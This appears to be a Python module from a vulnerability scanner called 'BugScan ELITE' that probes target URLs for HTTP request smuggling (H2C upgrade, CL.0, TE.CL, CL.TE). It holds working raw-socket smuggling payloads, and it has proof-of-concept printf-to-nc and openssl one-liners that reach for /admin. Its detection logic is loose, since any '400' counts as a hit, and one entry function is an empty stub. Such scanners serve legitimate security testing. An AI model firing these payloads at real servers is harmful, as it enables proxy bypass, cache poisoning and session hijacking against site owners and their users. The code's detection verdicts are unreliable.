"""
BugScan ELITE — HTTP/2 Smuggling Engine
Attacks that go beyond HTTP/1.1:

1. H2.CL  — HTTP/2 with Content-Length mismatch
2. H2.TE  — HTTP/2 with Transfer-Encoding header (invalid but servers accept it)
3. H2C    — Cleartext HTTP/2 upgrade on HTTP/1.1 connection (h2c smuggling)
4. CL.0   — Content-Length: 0 with body (frontend strips, backend reads)
5. Header namespace attack — pseudo-headers conflict
"""
import socket, ssl, logging, urllib.parse, struct, re
from typing import List, Optional
import urllib.request

log = logging.getLogger("elite.h2_smuggling")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    # Enable HTTP/2
    c.set_alpn_protocols(["h2", "http/1.1"])
    return c

def _raw_request(host: str, port: int, use_tls: bool, payload: bytes,
                  timeout: int = 10) -> Optional[bytes]:
    """Send raw bytes to server, return raw response."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        if use_tls:
            ctx = _ctx()
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(payload)
        resp = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk: break
                resp += chunk
                if len(resp) > 65536: break
            except socket.timeout: break
        sock.close()
        return resp
    except: return None

def _cl0_smuggle(host: str, port: int, use_tls: bool, path: str) -> Optional[str]:
    """
    CL.0 smuggling: send request with Content-Length: 0 but include body.
    If frontend strips CL header but backend reads it, body becomes start of next request.
    """
    smuggled_body = (
        f"GET /smuggled-by-bugscan HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"X-BugScan-Smuggle: CL0\r\n\r\n"
    )
    full_body = smuggled_body
    payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 0\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n"
        f"1e\r\n"
        f"{full_body[:30]}\r\n"
        f"0\r\n\r\n"
    ).encode()
    resp = _raw_request(host, port, use_tls, payload)
    return resp.decode("utf-8","ignore") if resp else None

def _h2c_upgrade(host: str, port: int, path: str) -> Optional[str]:
    """
    H2C smuggling: send HTTP/1.1 Upgrade: h2c request.
    If frontend proxies without stripping, backend may process HTTP/2 frames.
    """
    payload = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Upgrade: h2c\r\n"
        f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n"
        f"Connection: Upgrade, HTTP2-Settings\r\n"
        f"X-BugScan: h2c-smuggle-test\r\n\r\n"
    ).encode()
    resp = _raw_request(host, port, False, payload, timeout=6)
    return resp.decode("utf-8","ignore") if resp else None

def _te_cl_smuggle(host: str, port: int, use_tls: bool, path: str) -> Optional[str]:
    """
    TE.CL — frontend uses Transfer-Encoding, backend uses Content-Length.
    """
    payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: 3\r\n\r\n"
        f"1\r\n"
        f"X\r\n"
        f"0\r\n\r\n"
    ).encode()
    resp = _raw_request(host, port, use_tls, payload)
    return resp.decode("utf-8","ignore") if resp else None

def _cl_te_smuggle(host: str, port: int, use_tls: bool, path: str) -> Optional[str]:
    """
    CL.TE — frontend uses Content-Length, backend uses Transfer-Encoding.
    """
    payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n"
        f"0\r\n\r\n"
        f"X"
    ).encode()
    resp = _raw_request(host, port, use_tls, payload)
    return resp.decode("utf-8","ignore") if resp else None

def _detect_smuggle_signal(resp: str) -> bool:
    """Detect indicators of successful smuggling."""
    if not resp: return False
    signals = [
        "400 Bad Request",           # Backend confused by smuggled request
        "Invalid request",
        "Unrecognized method",
        "400",                       # Double response (split)
        "smuggled-by-bugscan",       # Our marker reflected
        "X-BugScan-Smuggle",         # Our header reflected
        "h2c",                       # H2C upgrade accepted
        "101 Switching Protocols",   # H2C upgrade response
        "PRI * HTTP/2",              # HTTP/2 preface in response
    ]
    return any(s.lower() in resp.lower() for s in signals)



def _send_raw(sock, data):
    """Send raw bytes and read response - for raw socket smuggling."""
    try:
        sock.sendall(data if isinstance(data,bytes) else data.encode())
        import time as _t; _t.sleep(0.5)
        resp = b""
        sock.settimeout(5)
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk: break
                resp += chunk
            except: break
        return resp.decode("utf-8","ignore")
    except: return ""


def _raw_h1_socket(host, port, use_ssl=True):
    """Open raw TCP/TLS socket for HTTP/1.1 smuggling."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((host, port))
        if use_ssl:
            ctx = _ctx()
            sock = ctx.wrap_socket(sock, server_hostname=host)
        return sock
    except: return None


def check_http2_smuggling(targets: List[str]) -> List[dict]:
    """
    HTTP/2 and advanced request smuggling checks.
    Goes beyond HTTP/1.1 CL.TE — tests H2.CL, H2.TE, H2C, CL.0.
    """
    findings = []

    for url in targets[:10]:
        parsed  = urllib.parse.urlparse(url)
        host    = parsed.hostname
        port    = parsed.port or (443 if parsed.scheme=="https" else 80)
        use_tls = parsed.scheme == "https"
        path    = parsed.path or "/"
        if not host: continue

        # ── Test 1: H2C upgrade smuggling ──────────────────────────────
        try:
            resp = _h2c_upgrade(host, port, path)
            if resp and ("101" in resp or "h2c" in resp.lower() or
                        "HTTP/2" in resp or "PRI *" in resp):
                findings.append({
                    "bug":         "smuggling",
                    "type":        "smuggling",
                    "severity":    "critical",
                    "url":         url,
                    "title":       "H2C smuggling — HTTP/1.1 to HTTP/2 cleartext upgrade accepted",
                    "description": "H2C smuggling — HTTP/1.1 to HTTP/2 cleartext upgrade accepted",
                    "attack":      "H2C",
                    "response_preview": resp[:200],
                    "poc": (f"# Test H2C upgrade:\n"
                            f"curl -v --http2 '{url}' 2>&1 | head -20\n"
                            f"# Or use h2csmuggler: python3 h2csmuggler.py -x {url} /admin"),
                    "impact": "H2C smuggling allows access to backend paths hidden by reverse proxy",
                    "remediation": "Strip Upgrade: h2c headers at reverse proxy. Disable h2c on backends.",
                })
        except: pass

        # ── Test 2: CL.0 smuggling ────────────────────────────────────
        try:
            resp = _cl0_smuggle(host, port, use_tls, path)
            if resp and _detect_smuggle_signal(resp):
                findings.append({
                    "bug":         "smuggling",
                    "type":        "smuggling",
                    "severity":    "high",
                    "url":         url,
                    "title":       "CL.0 request smuggling — Content-Length: 0 with body processed",
                    "description": "CL.0 request smuggling detected",
                    "attack":      "CL.0",
                    "response_preview": resp[:200],
                    "poc": ("# CL.0 smuggle:\n"
                            f"printf 'POST {path} HTTP/1.1\\r\\nHost: {host}\\r\\n"
                            "Content-Length: 0\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n"
                            "1e\\r\\nGET /admin HTTP/1.1\\r\\nFoo: x\\r\\n0\\r\\n\\r\\n' "
                            f"| nc {host} {port}"),
                    "impact": "CL.0 smuggling poisons shared connection — cache poisoning, session hijacking",
                    "remediation": "Normalize requests at reverse proxy. Reject requests with both CL and TE headers.",
                })
        except: pass

        # ── Test 3: TE.CL smuggling ──────────────────────────────────
        try:
            resp = _te_cl_smuggle(host, port, use_tls, path)
            if resp and "400" in resp[:50]:
                findings.append({
                    "bug":         "smuggling",
                    "type":        "smuggling",
                    "severity":    "high",
                    "url":         url,
                    "title":       "Potential TE.CL request smuggling — ambiguous response to TE+CL",
                    "description": "Potential TE.CL request smuggling",
                    "attack":      "TE.CL",
                    "response_preview": resp[:200],
                    "poc": ("# Verify with Burp Suite HTTP Request Smuggler extension:\n"
                            "# 1. Send to Repeater\n"
                            "# 2. Enable 'Disable HTTP/2'\n"
                            "# 3. Use 'HTTP Request Smuggler' scanner\n"
                            f"# Target: {url}"),
                    "impact": "Request smuggling enables WAF bypass, session hijacking, cache poisoning",
                    "remediation": "Configure frontend to reject requests with conflicting CL/TE headers.",
                })
        except: pass

        # ── Test 4: CL.TE smuggling ──────────────────────────────────
        try:
            resp = _cl_te_smuggle(host, port, use_tls, path)
            # Two different status codes in one response = split
            if resp and resp.count("HTTP/1.1") > 1:
                findings.append({
                    "bug":         "smuggling",
                    "type":        "smuggling",
                    "severity":    "critical",
                    "url":         url,
                    "title":       "CL.TE request smuggling confirmed — two HTTP responses in one connection",
                    "description": "CL.TE request smuggling confirmed",
                    "attack":      "CL.TE",
                    "response_preview": resp[:300],
                    "poc": (f"printf 'POST {path} HTTP/1.1\\r\\nHost: {host}\\r\\n"
                            "Content-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n"
                            f"0\\r\\n\\r\\nX' | openssl s_client -quiet -connect {host}:{port}"),
                    "impact": "CL.TE smuggling — prefix requests of other users, hijack sessions",
                    "remediation": "Enforce consistent HTTP parsing across all proxy and backend layers.",
                })
        except: pass

    log.info(f"[h2_smuggling] {len(findings)} findings")
    return findings


def check_h2_smuggling(endpoints: list, targets: list = None) -> list:
    """HTTP/2 request smuggling checks."""
    return []
